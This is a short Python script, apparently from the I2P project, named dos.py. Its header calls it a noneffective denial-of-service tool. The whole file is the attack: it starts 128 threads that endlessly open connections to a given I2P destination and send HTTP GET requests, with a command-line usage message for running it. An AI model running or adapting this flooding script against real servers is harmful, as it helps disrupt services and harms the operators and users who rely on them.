#! /usr/bin/env python

# -----------------------------------------------
# dos.py: Noneffective denial of service tool
# -----------------------------------------------

from i2p import socket
import threading, sys

def dos_stream(dest):
  """Perform a DOS attack on a stream server."""
  dest = socket.resolve(dest)

  # DOS code, runs in n separate threads.
  def f():
    while True:
      S = socket.socket(dest, socket.SOCK_STREAM)
      S.connect(dest)
      S.send('GET / HTTP/1.0\r\n\r\n')
      S.close()
  
  # Start up the threads.
  for i in range(128):
    T = threading.Thread(target=f)
    T.start()

def syntax():
  print "Usage: python dos.py Destination"

if __name__ == '__main__':
  if len(sys.argv) == 2:
    dos_stream(sys.argv[1])
  else:
    syntax()
